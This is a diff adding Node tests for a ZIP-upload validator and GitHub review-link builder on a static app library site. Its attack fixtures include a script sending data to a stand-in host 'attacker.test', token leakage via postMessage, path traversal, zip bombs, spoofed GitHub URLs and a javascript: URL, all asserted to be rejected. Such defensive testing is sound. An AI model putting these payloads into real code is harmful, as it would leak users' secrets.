@@ -1,7 +1,10 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import {readFileSync} from 'node:fs';
-import {deflateRawSync} from 'node:zlib';
+import {deflateRawSync,inflateRawSync} from 'node:zlib';
+import {createHash} from 'node:crypto';
+import {validateBrowserZip,validateGitHubSource,buildLibraryReviewIssue,LIMITS}
+ from '../site/library/intake-core.mjs';
 import {validateStaticAppFiles,validateStaticZip,validateStaticDirectory,
  MAX_FILE_BYTES,MAX_APP_BYTES} from '../packages/library/validator.mjs';
 import {validateLibraryCatalog,selectComparison,filterLibrary}
@@ -129,4 +132,109 @@ test('Library UI maintains separate untrusted iframe and never self-hosts arbitr
  assert.match(page,/id="library-search"/);
  assert.match(page,/id="library-category"/);
  assert.match(page,/href="https:\/\/24go\.top\/library\/"/);
+});
+
+
+const digest=async bytes=>createHash('sha256').update(bytes).digest('hex');
+const inflate=async bytes=>new Uint8Array(inflateRawSync(bytes,{
+ maxOutputLength:LIMITS.fileBytes+1
+}));
+const browserValidate=bytes=>validateBrowserZip(bytes,{digest,inflate});
+
+test('browser ZIP intake round-trips stored/deflate ZIP32 with the independent Node validator',async()=>{
+ for(const deflate of [false,true]){
+  const entries=[['index.html',minimal],
+   ['assets/ui.css','body{padding:12px}'],
+   ['assets/app.js','const answer = 42;']];
+  const zip=makeZip(entries,{deflate});
+  const browser=await browserValidate(zip),node=validateStaticZip(zip);
+  assert.deepEqual(browser,node);
+  assert.equal(browser.automaticHosting,false);
+  assert.equal(browser.reviewRequired,true);
+  assert.equal(browser.files.length,3);
+  assert.equal(browser.entry,'index.html');
+  assert.equal(LIMITS.archiveBytes,4*1024*1024);
+ }
+});
+
+test('browser intake rejects forged content, CRC corruption, traversal and package bombs',async()=>{
+ const attacks=[
+  [['../outside.html',minimal]],
+  [['index.html',minimal],['../admin.js','bad']],
+  [['index.html',minimal],['server.py','print(1)']],
+  [['index.html',minimal],['index.html',minimal]],
+  [['index.html',minimal],['Index.HTML',minimal]],
+  [['index.html',minimal],['script.js','fetch("https://attacker.test/secret")']],
+  [['index.html',minimal],['script.js','window.parent.postMessage("token","*")']],
+  [['index.html',minimal],['module.js','new Function("return this")()']],
+  [['index.html',minimal],['style.css','body{background:url(https://example.test/x)}']],
+  [['index.html',minimal],['module.wasm','binary']]
+ ];
+ for(const entries of attacks){
+  await assert.rejects(()=>browserValidate(makeZip(entries)),/Unsafe ZIP:/);
+ }
+ for(const options of [{corrupt:true},{symlink:true}]){
+  await assert.rejects(()=>browserValidate(makeZip([['index.html',minimal]],options)),/Unsafe ZIP:/);
+ }
+ await assert.rejects(()=>browserValidate(Buffer.from('this is not a zip')),/Unsafe ZIP:/);
+ await assert.rejects(()=>browserValidate(Buffer.alloc(LIMITS.archiveBytes+1)),/Unsafe ZIP:/);
+ await assert.rejects(()=>browserValidate(makeZip([['index.html','X'.repeat(LIMITS.fileBytes+1)]])),/Unsafe ZIP:/);
+ const deflateZip=makeZip([['index.html',minimal]],{deflate:true});
+ await assert.rejects(()=>validateBrowserZip(deflateZip,{
+  digest,inflate:async()=>new Uint8Array(LIMITS.fileBytes+1)
+ }),/Unsafe ZIP:/);
+ const huge=makeZip([['index.html',minimal],['data.json','a'.repeat(512*1024)]],{deflate:true});
+ await assert.rejects(()=>validateBrowserZip(huge,{
+  digest,inflate:async()=>new Uint8Array(LIMITS.fileBytes+50)
+ }),/Unsafe ZIP:/);
+});
+
+test('app source-review link uses explicit safe GitHub origin and bounded metadata only',async()=>{
+ const report=await browserValidate(makeZip([['index.html',minimal]],{deflate:true}));
+ const url=buildLibraryReviewIssue({
+  name:'Useful Static App',repository:'https://github.com/Contributor/example-app',report
+ });
+ const parsed=new URL(url);
+ assert.equal(parsed.origin,'https://github.com');
+ assert.equal(parsed.pathname,'/rf24kja/24GO.top/issues/new');
+ assert.equal(parsed.searchParams.get('title'),'Library app review: Useful Static App');
+ const body=parsed.searchParams.get('body');
+ assert.match(body,/Public source: https:\/\/github.com\/Contributor\/example-app/);
+ assert.match(body,new RegExp(report.archiveSha256));
+ assert.match(body,/No ZIP was uploaded/);
+ assert.ok(body.length<1200);
+ assert.ok(!body.includes(minimal));
+ assert.ok(!url.includes('index.html'));
+ for(const candidate of [
+  'http://github.com/owner/repo',
+  'https://evil-github.com/owner/repo',
+  'https://github.com.evil.test/owner/repo',
+  'https://github.com/owner/repo?secret=x',
+  'https://github.com/owner/repo/tree/main',
+  'javascript:alert(1)',
+  'https://github.com/owner/../private',
+  'https://user:pass@github.com/owner/repo'
+ ])assert.throws(()=>validateGitHubSource(candidate),TypeError,candidate);
+ assert.throws(()=>buildLibraryReviewIssue({
+  name:'A\nInjected issue',repository:'https://github.com/owner/repo',report
+ }),TypeError);
+ assert.throws(()=>buildLibraryReviewIssue({
+  name:'Safe App',repository:'https://github.com/owner/repo',
+  report:{...report,automaticHosting:true}
+ }),TypeError);
+});
+
+test('browser intake uses no network calls, DOM execution, storage or implicit issue submission',()=>{
+ const html=read('index.html').toString('utf8');
+ const code=read('intake.mjs').toString('utf8');
+ const core=read('intake-core.mjs').toString('utf8');
+ assert.match(html,/id="library-zip"/);
+ assert.match(html,/id="library-validate"/);
+ assert.match(html,/id="library-review-link"/);
+ assert.match(html,/type="module" src="\.\/intake\.mjs"/);
+ assert.doesNotMatch(code,/\bfetch\s*\(|innerHTML|eval\s*\(|localStorage|sessionStorage|sendBeacon/);
+ assert.doesNotMatch(core,/\bfetch\s*\(|innerHTML|eval\s*\(|localStorage|sessionStorage|sendBeacon/);
+ assert.match(code,/selected\.arrayBuffer\(\)/);
+ assert.match(core,/DecompressionStream\('deflate-raw'\)/);
+ assert.match(html,/The review link sends only/);
 });
